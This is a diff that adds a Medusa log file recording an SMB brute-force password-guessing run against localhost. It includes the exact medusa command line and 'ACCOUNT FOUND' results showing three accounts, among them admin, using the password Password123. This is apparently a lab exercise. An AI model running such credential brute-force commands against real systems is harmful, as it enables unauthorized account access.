@@ -1,0 +1,9 @@
+# Medusa v.2.2 (2026-02-23 02:54:40)
+# medusa -h 127.0.0.1 -U smb_users.txt -P smb_password.txt -M smbnt -O smb_attack_log.txt 
+# Medusa has finished (2026-02-23 02:54:40).
+# Medusa v.2.2 (2026-02-23 02:55:22)
+# medusa -h 127.0.0.1 -U smb_users.txt -P smb_password.txt -M smbnt -O smb_attack_log.txt 
+ACCOUNT FOUND: [smbnt] Host: 127.0.0.1 User: user1 Password: Password123 [ERROR (0xFFFFFF:UNKNOWN_ERROR_CODE)]
+ACCOUNT FOUND: [smbnt] Host: 127.0.0.1 User: user2 Password: Password123 [ERROR (0xFFFFFF:UNKNOWN_ERROR_CODE)]
+ACCOUNT FOUND: [smbnt] Host: 127.0.0.1 User: admin Password: Password123 [ERROR (0xFFFFFF:UNKNOWN_ERROR_CODE)]
+# Medusa has finished (2026-02-23 02:55:22).
